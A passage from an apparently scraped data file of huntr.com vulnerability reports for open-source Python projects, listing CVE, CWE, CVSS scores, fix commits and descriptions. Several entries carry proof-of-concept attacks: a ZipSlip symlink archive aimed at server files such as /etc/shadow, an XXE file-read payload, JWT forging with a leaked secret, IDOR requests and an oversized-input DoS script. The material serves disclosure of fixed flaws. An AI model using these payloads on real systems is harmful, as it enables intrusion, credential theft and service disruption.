\"L433DJ0Xtp97EpAMROtkIyLX8KZsXWUxGYHZTcUET4WXL0EtbqgZYydelin9y4G7\", \"X-Requested-With\": \"XMLHttpRequest\", \"Origin\": \"http://192.168.1.5:8000\", \"DNT\": \"1\", \"Connection\": \"close\"}\necho_time = \"A\"*100000000\nburp0_json={\"notes\": echo_time}\nrequest = request_handler.patch(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)\nprint(request.text)\nprint(request.status_code)\nImpact\nShould a user visit one of the exploited parts, the vulnerable page will not load appropriately. The victim may see their computer become unresponsive as the processor works to process the amount of data being served by the vulnerable notes section.\nRecommendation\nApply a consistent character limit across the application where user input can be added to notes sections."}, "https://huntr.com/bounties/a370e0c2-a41c-4871-ad91-bc6f31a8e839/": {"cve": "CVE-2023-0509", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-0509", "cwe": "CWE-295: Improper Certificate Validation", "cwe_link": "https://cwe.mitre.org/data/definitions/295.html", "severity_score": "High (7.4)\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/pyload/pyload", "fix_commit": "https://www.github.com/pyload/pyload/commit/a9098bdf7406e6faf9df3da6ff2d584e90c13bbb", "description": "Description\nWhen a certificate is invalid or malicious, it might allow an attacker to spoof a trusted entity by interfering in the communication path between the host and client. The software might connect to a malicious host while believing it is a trusted host, or the software might be deceived into accepting spoofed data that appears to originate from a trusted host.\nProof of Concept\nAdd package with a link whose host's SSL certificate is invalid. E.g. https://self-signed.badssl.com/\nGo to the Files tab and see there is the content of the above-mentioned link.\nImpact\nThis vulnerability is capable of allowing an attacker to intercept data sent over HTTPS connections ."}, "https://huntr.com/bounties/4b9adfef-b471-40ee-a599-76a136a15905/": {"cve": "", "cve_link": "", "cwe": "CWE-295: Improper Certificate Validation", "cwe_link": "https://cwe.mitre.org/data/definitions/295.html", "severity_score": "Medium (5.9)\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/zeromq/pyzmq", "fix_commit": "https://www.github.com/zeromq/pyzmq/commit/c7be48b73bdc9c337b7f571ff9c74d08f3f947af", "description": "\u270d\ufe0f Description\nThe paramiko.WarningPolicy policy used in set_missing_host_key_policy will not reject unknown host keys. This may lead to Man-in-the-middle attacks.\n\ud83d\udd75\ufe0f\u200d\u2642\ufe0f Proof of Concept\nclient = paramiko.SSHClient()\nclient.load_system_host_keys()\nclient.set_missing_host_key_policy(paramiko.WarningPolicy())\n\ud83d\udca5 Impact\nThat you have become vulnerable to man-in-the-middle attacks."}, "https://huntr.com/bounties/3c48ef5d-da4d-4ee4-aaca-af65e7273720/": {"cve": "CVE-2022-4721", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-4721", "cwe": "CWE-75: Failure to Sanitize Special Elements into a Different Plane (Special Element Injection)", "cwe_link": "https://cwe.mitre.org/data/definitions/75.html", "severity_score": "Medium (6.6)\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/6afaae56a29536f0118b3380d296c416aa6d078d", "description": "Description\nLack of sanitisation of characters in SSH key name could allow attacker to inject a hyperlink injection that could allow attacker to redirect victim to malicious websites\nProof of Concept\n1) Go to https://rdiffweb-dev.ikus-soft.com/prefs/sshkeys \n2) Add SSH key\n3) Enter the name evil.com \n4) Due to lack of sanitisation , this might cause a hyperlink injection attack once email is triggered successfully on adding SSH key\n\n\n\n\n# Impact\n\nThis issue allows an attacker to redirect victim to malicious website and cause a phishing attack"}, "https://huntr.com/bounties/2d1db3c9-93e8-4902-a55b-5ea53c22aa11/": {"cve": "CVE-2022-3607", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3607", "cwe": "CWE-75: Failure to Sanitize Special Elements into a Different Plane (Special Element Injection)", "cwe_link": "https://cwe.mitre.org/data/definitions/75.html", "severity_score": "Medium (6)\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nHigh\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/octoprint/octoprint", "fix_commit": "https://www.github.com/octoprint/octoprint/commit/3cca3a43f3d085e9bbe5a5840c8255bb1b5d052e", "description": "Using the ZipSlip symlink variant, it is possible to steal any file from the OctoPrint remote server via an upload of a maliciously crafted archive as a language pack and download the stolen files within a backup archive.\nTo set up the Octoprint web application, we used the dockerized version\nsudo docker volume create octoprint\nsudo docker run -d -v octoprint:/octoprint -p 80:80 --name octoprint octoprint/octoprint\nGenerate a maliciously crafted archive as follow:\n# unzip the language pack for italian\nunzip language-pack-it.zip \ncd ./it/LC_MESSAGES/\n\n# generate a symlink as shown below, notice the difference between ../ and ./\nln -s ././../../../../../../../../../etc/issue issue.y3\n\n# add it to a maliciously crafted TAR archive\ntar -cvf it_crafted.tar ./it/\nAfter initial configuration with default parameters, login and head to OctoPrint Settings > Octoprint Appearance > Language Packs. Click on Manage > Upload additional Language Packs. Upload the it_crafted.tar archive as a language pack.\nNow, head to Octoprint settings > Backup & Restore. Click on Create backup now. Download the new backup archive. Read the content of the file located within the backup archive at /basedir/translations/it/LC_MESSAGES/issue.y3. You will get the server-side issue file.\nImpact\nAn impact would be to steal /etc/passwd and /etc/shadow and decrypt passwords or steal files within ~/.ssh to remotely access the Octoprint box."}, "https://huntr.com/bounties/02207c8f-2b15-4a31-a86a-74fd2fca0ed1/": {"cve": "CVE-2022-3327", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3327", "cwe": "CWE-306: Missing Authentication for Critical Function", "cwe_link": "https://cwe.mitre.org/data/definitions/306.html", "severity_score": "Medium (4.5)\nAttack vector\nPhysical\nAttack complexity\nLow\nPrivileges required\nHigh\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/f2a32f2a9f3fb8be1a9432ac3d81d3aacdb13095", "description": "Description\nIt is important to implement password checks on sensitive features like email change\nProof of Concept\n1) Go to https://rdiffweb-demo.ikus-soft.com/login/ \n2) Use the credentials admin , admin123 and login into your account \n3) Navigate to the endpoint https://rdiffweb-demo.ikus-soft.com/prefs/general \n4) Change the email and save changes\n5) You will notice that there is no password confirmation during this sensitive action \n\nMitigation: There must be a password confirmation on sensitive actions like email change\n\n\n\n\n# Impact\n\nIf some one left his account open on public computer(say office or cafe), then attacker can change the email associated with this account easily"}, "https://huntr.com/bounties/5340c2f6-0252-40f6-8929-cca5d64958a5/": {"cve": "CVE-2022-4018", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-4018", "cwe": "CWE-306: Missing Authentication for Critical Function", "cwe_link": "https://cwe.mitre.org/data/definitions/306.html", "severity_score": "Medium (6.1)\nAttack vector\nPhysical\nAttack complexity\nLow\nPrivileges required\nHigh\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/f2a32f2a9f3fb8be1a9432ac3d81d3aacdb13095", "description": "Description\nAn attacker is able to bypass 2FA verification during 2FA disable function of user and restrict user from accessing his account due to a application logic flaw\nProof of Concept\nFirst of all let us consider a scenario where a user has left his account open on a public device (library or cafe) and attacker gets access to that device \n\n1) Go to https://rdiffweb-dev.ikus-soft.com/prefs/mfa , click on disable 2FA . Sadly , the verification code is sent on the users email and you cant get access to it\n2) Lets dive into an application logic flaw.\n3) Attacker will go to https://rdiffweb-dev.ikus-soft.com/prefs/general change email from user email to attacker email and save changes\n4) He will go back to https://rdiffweb-dev.ikus-soft.com/prefs/mfa and now click on disable 2FA again . \n5) As the email associated with the account is attackers email , he will receive the verification link \n6) He can go ahead and disable 2FA now.\n\nPOC:\nhttps://drive.google.com/file/d/1iA_JSlhwCLt54IIpRHx2Ey9yt1Sltchq/view?usp=sharing\n\n\n# Impact\n\nAttacker is able to disable users 2FA , allowing the reduce component security implemented by user"}, "https://huntr.com/bounties/d8b8519d-96a5-484c-8141-624c54290bf5/": {"cve": "CVE-2022-3290", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3290", "cwe": "CWE-130: Improper Handling of Length Parameter Inconsistency", "cwe_link": "https://cwe.mitre.org/data/definitions/130.html", "severity_score": "Medium (5.7)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/667657c6fe2b336c90be37f37fb92f65df4feee3", "description": "Description\nThere must be a fixed length for user input parameters like username. Allowing users to enter long strings may result in a DOS attack or memory corruption\nProof of Concept\n1)Go to https://rdiffweb-demo.ikus-soft.com/admin/users endpoint . 2)Click on add user 3)Here you will see that there is no limit for the username length that allows a user to to set a very long string as long as 1 million characters 4)This may possible result in a memory corruption/DOS attack\nMitigation: There must be a fixed length for the username - upto 256 characters\nImpact\nAllows an attacker to set a username with long string leading to memory corruption/possible DOS attack"}, "https://huntr.com/bounties/733678b9-daa1-4d6a-875a-382fa09a6e38/": {"cve": "CVE-2022-3272", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3272", "cwe": "CWE-130: Improper Handling of Length Parameter Inconsistency", "cwe_link": "https://cwe.mitre.org/data/definitions/130.html", "severity_score": "Medium (5.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/667657c6fe2b336c90be37f37fb92f65df4feee3", "description": "Description\nAs per RFC the maximum length allowed for an email address is 255 characters. However, rdiffweb don't validate email length, so you can add email addresses that exceed 255 characters. Through this, if you sign up for an email with a length of 1 million or more and log in, withdraw, or change your email, the server may cause DOS due to overload.\nProof of Concept\nGo to https://rdiffweb-demo.ikus-soft.com/prefs/general\nYou can now change the email associated with your account from this endpoint\nSet a very long email that exceeds 1000 characters\nYou will see that the long email is readily accepted and there is no fixed length for this user input parameter\nMitigation: The email parameter must have a specific user input length\nImpact\nAn attacker can store a large email address as per his requirement which will possibly lead to a DOS attack / Buffer Overflow"}, "https://huntr.com/bounties/defa4944-b28c-47bc-8479-5a74d9e8ff18/": {"cve": "", "cve_link": "", "cwe": "CWE-266: Incorrect Privilege Assignment", "cwe_link": "https://cwe.mitre.org/data/definitions/266.html", "severity_score": "Critical (9.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/bookwyrm-social/bookwyrm", "fix_commit": "https://www.github.com/bookwyrm-social/bookwyrm/commit/41b20c4dd58406ce71bf121e434759ba764d7e2b", "description": "Description\nInsecure direct object references when creating a list allows one user to create a new list on behalf of another.\nProof of Concept\nPOST /list HTTP/2\nHost: bookwyrm.social\nCookie: django_language=None; csrftoken=I5lj4znBJ9B5HnT3FAsII67G1EISidIKGlsIz5ElN9kmlDwucM2hGKx0Fy4gM8vj; sessionid=kskbj9mmxksyiaqyup8tsri8zrh6x0xi\nContent-Length: 158\nCache-Control: max-age=0\nSec-Ch-Ua: \"Chromium\";v=\"103\", \".Not/A)Brand\";v=\"99\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Windows\"\nUpgrade-Insecure-Requests: 1\nOrigin: https://bookwyrm.social\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://bookwyrm.social/user/<user1>/lists\nAccept-Encoding: gzip, deflate\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\n\ncsrfmiddlewaretoken=z1U84ZsGwubuTiOAGXssNXkAfZ7KbII6xh1xzvJqAuULxyr1d921LBKUTTt8FDvF&user=<user2_id>&name=testname&description=testdes&curation=closed&privacy=public\nSteps to reproduce\n1.Login with user1 account then go to Profile page.\n2.Go to the Lists tab then create a new list.\n3.Intercept the request, in the body content, change the value of user from user1_id to user2_id then forward the request.\n4.You will see that a new list is create in user2 account instead of user1 account.\nImpact\nThis vulnerability is capable of allows a user to create a list on other users' accounts, affecting the logic of the application."}, "https://huntr.com/bounties/d9461154-88f1-4c2d-9280-3fbe1437aa7f/": {"cve": "", "cve_link": "", "cwe": "CWE-266: Incorrect Privilege Assignment", "cwe_link": "https://cwe.mitre.org/data/definitions/266.html", "severity_score": "Critical (9.9)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/bookwyrm-social/bookwyrm", "fix_commit": "https://www.github.com/bookwyrm-social/bookwyrm/commit/b66ce2e6a5e09f8f7e8b64256ddd43bee1a68c65", "description": "Description\nInsecure direct object references in review a book function allows one user to create a comment on behalf of another.\nProof of Concept\nPOST /post/review HTTP/2\nHost: book.dansmonorage.blue\nCookie: csrftoken=bYsdqkQkkbYXZYRVd8AynhYxG1rBb2AoOfAO76XCYmgzXK3A266EpZamGcKL0pN5; django_language=None; sessionid=yq7gxnp9ypxohws3mmh1h7mrgogg6xsz\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0\nAccept: application/json\nAccept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nReferer: https://book.dansmonorage.blue/\nContent-Type: multipart/form-data; boundary=---------------------------269697065920795935563955484832\nContent-Length: 1207\nOrigin: https://book.dansmonorage.blue\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-Pwnfox-Color: green\nTe: trailers\n\n-----------------------------269697065920795935563955484832\nContent-Disposition: form-data; name=\"csrfmiddlewaretoken\"\n\nEEplsmJEq47ABzhShOKjf4PAbhjHG2YohVxW98QW4fpczltx6MgphM1pbsCRvpb5\n-----------------------------269697065920795935563955484832\nContent-Disposition: form-data; name=\"book\"\n\n60596\n-----------------------------269697065920795935563955484832\nContent-Disposition: form-data; name=\"user\"\n\n6847 // change others id\n-----------------------------269697065920795935563955484832\nContent-Disposition: form-data; name=\"reply_parent\"\n\n\n-----------------------------269697065920795935563955484832\nContent-Disposition: form-data; name=\"name\"\n\nFrom id 6847\n-----------------------------269697065920795935563955484832\nContent-Disposition: form-data; name=\"rating\"\n\n\n-----------------------------269697065920795935563955484832\nContent-Disposition: form-data; name=\"content\"\n\nMy book1 <h1>123</h1>\n-----------------------------269697065920795935563955484832\nContent-Disposition: form-data; name=\"content_warning\"\n\n\n-----------------------------269697065920795935563955484832\nContent-Disposition: form-data; name=\"privacy\"\n\npublic\n-----------------------------269697065920795935563955484832--\nImpact\nThis vulnerability is capable of allows a user to review a book on other users' accounts, affecting the logic of the application."}, "https://huntr.com/bounties/9addd96d-7aa6-434c-b564-d10c0e912c40/": {"cve": "", "cve_link": "", "cwe": "CWE-204: Observable Response Discrepancy", "cwe_link": "https://cwe.mitre.org/data/definitions/204.html", "severity_score": "High (7.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/bookwyrm-social/bookwyrm", "fix_commit": "https://www.github.com/bookwyrm-social/bookwyrm/commit/aa579605e0696b96df80f1198321b8065d818dea", "description": "Description\nThrough the Resend link page, an attacker can know that if an email exists or not; just by observing the notification in the response page. So, once the attacker knows that an email exists, he can launch a brute force attack against it.\nIf an email exists:\nThere is no notification and a confirmation link will be sent to <email_address>.\nIf an email does not exist:\nThe notification will be No user matching this email address found. with red color.\nProof of Concept\n1.Go to the Resend link page (https://bookwyrm.social/resend-link)\n2.Enter an existed email and click Resend link.\n3.Check the mail box.\n4.Enter a non-existed email (Ex: test@local.com) and click Resend link.\n3.Observe the error notification.\nImpact\nAccount enumeration is a potential security risk whereby a web site gives out information about what accounts are already in the system. This may: a) leave them susceptible to a brute-force attack b) may violate their users privacy which may be very important for certain types of sites."}, "https://huntr.com/bounties/1a3ab14a-f312-47c1-b314-5ce6b6bf59e9/": {"cve": "", "cve_link": "", "cwe": "CWE-204: Observable Response Discrepancy", "cwe_link": "https://cwe.mitre.org/data/definitions/204.html", "severity_score": "Medium (5.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/inventree/inventree", "fix_commit": "https://www.github.com/inventree/inventree/commit/18cf92ec8b30e941386def2fca647e1bb8c8d540", "description": "Description\nThe password reset function at the login page responds to valid and invalid emails in the application. Submitting an invalid email result in \"The e-mail address is not assigned to any user account.\" A valid response results in a message stating an email has been sent.\nProof of Concept\n1. Select \"Forgot Password\" on the InvenTree sign on page\n2. Enter an invalid email and observe the results suggested in the description.\nImpact\nAn attacker can identify valid user email accounts which permits the attacker to increase the application's attack surface. The severity is lowered slightly due to email accounts being separate from the username.\nRecommendation\nSynchronize response messages in the password reset request. I suggest something like, \"You will receive an email in a few minutes if the email is in our system.\""}, "https://huntr.com/bounties/0569d9dd-9402-4e4e-8c86-aa9d98a13379/": {"cve": "", "cve_link": "", "cwe": "CWE-213: Exposure of Sensitive Information Due to Incompatible Policies", "cwe_link": "https://cwe.mitre.org/data/definitions/213.html", "severity_score": "Low (3.3)\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/wagtail/wagtail", "fix_commit": "https://www.github.com/wagtail/wagtail/commit/8ec42858f92bd84be1ca4278ce63c63b7f37f0aa", "description": "Description\n- From any user account without authority go to /admin/users page to view employee information but can leak all employee names that \n  exist on the platform.\nThe vulnerabilities occurred in the 3 features : delete, set active state, assign role in page /admin/users and /admin/groups/{group_number}/users/\nProof of Concept\n   - Step 1 : From the admin account, go to /admin/users or /admin/groups/{group_number}/users/\n\n   - Step 2 :  Choose any account and use 1 of 3 features: delete, set active state, assign role, you will be navigated to a path like this:\n           + /admin/bulk/auth/user/delete/?next=%2Fadmin%2Fusers%2F&id=5 (with delete feature)\n           + /admin/bulk/auth/user/assign_role/?next=%2Fadmin%2Fusers%2F&id=2 (with assign_role feature)\n           +  /admin/bulk/auth/user/set_active_state/?next=%2Fadmin%2Fusers%2F&id=3 (with set_active_state feature)\n            * Note : You need to change the value of parameter id to see other user information.\n                           With more than 1 &id parameter you can view more user names at the same time (eg : /admin/bulk/auth/user/delete/? \n                           next=%2Fadmin%2Fusers%2F&id=5&id=6&id=4 The condition is that all 3 ids exist)\n\n   - Step 3 : Use any account with the permissions I described in the description, then access the link and change the value of the id \n                    parameter, you can get the names of all users.\n             * Note : To make it easiest, first test with an account without any permissions. Then give that account more permissions and check \n                            again\nImpact\nLeak all names of users is an extremely dangerous step for attackers to carry out other forms of attacks such as :\nBrute force login attack\nSpear Phishing\nGathering more information\nPersonalized Attacks\nand other types of dangerous attacks"}, "https://huntr.com/bounties/692bf03d-973b-4fbc-b9e4-dd158bdd422b/": {"cve": "", "cve_link": "", "cwe": "CWE-776: XML Entity Expansion", "cwe_link": "https://cwe.mitre.org/data/definitions/776.html", "severity_score": "Critical (9.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/sympy/sympy", "fix_commit": "https://www.github.com/sympy/sympy/commit/e2734be0a527528a1450748c7a06cd973a9634b3", "description": "Description\nSympy is an open source platform that a computer algebra system written in pure Python . Sympy is vulnerable to an XML External Entity (XXE) injection in the apply_xsl() functionality of Sympy due to the usage of etree.XML.\nProof of Concept\n// PoC.py\nfrom sympy.utilities.mathml import apply_xsl\nxsl = 'mathml/data/simple_mmlctop.xsl'\n\nmml = '''\n<!--?xml version=\"1.0\" ?-->\n<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///d:/test/sensitive.txt\"> ]>\n<userInfo>\n<firstName>John</firstName>\n<lastName>&ent;</lastName>\n</userInfo>\n'''\n\nres = apply_xsl(mml,xsl)\n\nprint(res)\nOUTPUT:\n<?xml version=\"1.0\"?>\n<userInfo>\n<firstName>John</firstName>\n<lastName>\nSENSITIVE INFORMATION.\nUSERNAME: TEST\nPASSWORD: TEST\n</lastName>\n</userInfo>\nImpact\nAs this vulnerable to XXE, which may lead to Arbitrary File Read, DoS, SSRF."}, "https://huntr.com/bounties/1714df73-e639-4d64-ab25-ced82dad9f85/": {"cve": "", "cve_link": "", "cwe": "CWE-821: Incorrect Synchronization", "cwe_link": "https://cwe.mitre.org/data/definitions/821.html", "severity_score": "None (0)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/kiwitcms/kiwi", "fix_commit": "https://www.github.com/kiwitcms/kiwi/commit/20c3e3fed9cfa1e39df9054ae5803d0960f72e83", "description": "Description\nhi team, when i try to create users for on https://public.tenant.kiwitcms.org/admin/auth/user/<yourid>/change/ i see that the users are not properly authenticated. i can create users with the same firstname,lastname, and email. normally, when we create the same users it should error with the response users already and email already, this belongs to the business logic vulnerability as well. i can also create users with account owner email address admin@kiwitcms.org and it works. now i have users with account owner email address kiwitcms.org\nProof of Concept\n1. go to create account and go to my profile\n1. enter your firtsname like test and lastname demo and email You can use admin@kiwitcms.org up to 3 times\n1. successfully to create users with the same email address and firstname, lastname\n\n\n# Impact\n\nAttackers can arbitrarily and without the victim's consent make new users use their email."}, "https://huntr.com/bounties/9a6b1fb4-ec9b-4cfa-af1e-9ce304924829/": {"cve": "CVE-2023-1712", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-1712", "cwe": "CWE-547: Use of Hard-coded, Security-relevant Constants", "cwe_link": "https://cwe.mitre.org/data/definitions/547.html", "severity_score": "Critical (9.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/deepset-ai/haystack", "fix_commit": "https://www.github.com/deepset-ai/haystack/commit/5fc84904f198de661d5b933fde756aa922bf09f1", "description": "Although the annotator tool's source code is not directly provided in the repository a docker image is provided. From there it is easy to get access to the source code by either extracting the docker tar image, which can be exported from docker itself, or connecting to the container with an interactive session and browsing the application files.\nThe vulnerability is based on the hard coded value of config.jwt.secret = Hm************tA which is located at config/config.production.js Using this value it is possible to create new jwt tokens that have the super_admin role and allow a low level user to make previously restricted actions.\nTo make the attack work the same method that was used for producing the original tokens must be applied for the forged ones. The easiest way to do this is by making some modification to the existing back-end code of the annotation tool. For example adding the lines provided below in the getSignedJWT function found in app/service/userService.js. Running a locally host version of the modded back-end and logging in with a simple user would also produce a new jwt token with the super_admin role. To use this new token simply read it from /tmp/test.txt inside the running container or host system and change the value of dpst-token found in local storage of your browser for the domain that was used to make the original login.\nProof of Concept\n const fs = require('fs');\n    let x = this.app.jwt.sign(\n      {\n        id: 2,\n        email: \"r4F705@proxy.com\",\n        role: \"super_admin\",\n      },\n      \"Hm************tA\"\n    );\n\n    fs.writeFile('/tmp/test.txt', x, err => {\n      if (err) {\n        console.error(err);\n      }\n    });\nImpact\nThis impacts all the current versions of the annotation tool that are hosted either online or on company's internal network. Because the containers used will share the same secret key and that means that the forged tokens produced this way will work for all of them. Further more because of the way that the authentication is handled in the application it also means that you do not even need a valid account to login. Just a forged token and you have access to the application as a super admin.\nThis can affect both the integrity and availability of the tool and data. A logged in super admin can log in as any other user which means that he can make changes on behalf of them and mess up the annotation process and the results should no longer be trusted as training data for a QA model. Also with a scripted attack that removes created user the use of the tool can become very difficult.\nPS: The permalink below is not real, due to the nature of the bug, it is just used to pass the mandatory check."}, "https://huntr.com/bounties/a3e32ad5-caee-4f43-b10a-4a876d4e3f1d/": {"cve": "CVE-2023-0435", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-0435", "cwe": "CWE-1125: Excessive Attack Surface", "cwe_link": "https://cwe.mitre.org/data/definitions/1125.html", "severity_score": "Medium (4)\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/pyload/pyload", "fix_commit": "https://www.github.com/pyload/pyload/commit/431ea6f0371d748df66b344a05ca1a8e0310cff3", "description": "Description\nMootools-more 1.6.0 is use which is potential vulnerable to CVE-2021-20088\nProof of Concept\nhttps://github.com/BlackFan/client-side-prototype-pollution/blob/master/pp/mootools-more.md\n# Impact\n\nThis vulnerability is capable of potential prototype pollution upon executing the CVE"}, "https://huntr.com/bounties/cfcab02e-d6ad-4dcf-b1b0-da90434bc55b/": {"cve": "CVE-2022-3457", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3457", "cwe": "CWE-346: Origin Validation Error", "cwe_link": "https://cwe.mitre.org/data/definitions/346.html", "severity_score": "Low (3.7)\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/afc1bdfab5161c74012ff2590a6ec49cc0d8fde0", "description": "In the following python script\n    if request.method in ['POST', 'PUT', 'PATCH', 'DELETE']:\n        origin = request.headers.get('Origin', None)\n        if origin and not origin.startswith(request.base):\n            raise cherrypy.HTTPError(403, 'Unexpected Origin header')\nExplanation:\nIn the above lines of code, The origin is being only validated from the start of domain name only https://rdiffweb-demo.ikus-soft.com. But it isn't validated after the actual domain name https://rdiffweb-demo.ikus-soft.com .nithissh.com\nFor Example,\nIf we enter the following domain https://nithissh.com.rdiffweb-demo.ikus-soft.com as an origin and then the origin header being validated and returns a 403 status as expected in the code\nBut Now we can bypass the above validation check, By a creating subdomain after the soft.com.^ as follows https://rdiffweb-demo.ikus-soft.com .nithissh.com.\nImpact\nThese kind of origin validation bypasses helps in chaining with other vulnerabilities like CSRF, XSS and Clickjack as well\nRemediation\nThis is a snippet of regex for a user input and we can make use of this in the Origin header validation as well\nimport re\n\ndef use_regex(input_text):\n    pattern = re.compile(r\"^rdiffweb-demo\\.ikus-soft\\.com$\", re.IGNORECASE)\n    return pattern.match(input_text)"}, "https://huntr.com/bounties/b1b2a50c-fe18-431d-99e2-46a0ded2acd5/": {"cve": "", "cve_link": "", "cwe": "CWE-1024: Comparison of Incompatible Types", "cwe_link": "https://cwe.mitre.org/data/definitions/1024.html", "severity_score": "High (7.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/pyeve/eve", "fix_commit": "https://www.github.com/pyeve/eve/commit/71689d4c8ca1419c1686c9d8d4ce33eb442c914a", "description": "Description\nA conditional statement that always resolves to False.\nProof of Concept\n// eve/methods/common.py\n        if (\n            field in document\n            and document[field] is not None\n            and document[field] is not []  # Always resolves to False\n        ):\n            related_links = []\nImpact\nThe nested code block will never execute, resulting in invalid data."}, "https://huntr.com/bounties/e9309018-e94f-4e15-b7d1-5d38b6021c5d/": {"cve": "CVE-2022-3292", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3292", "cwe": "CWE-524: Use of Cache Containing Sensitive Information", "cwe_link": "https://cwe.mitre.org/data/definitions/524.html", "severity_score": 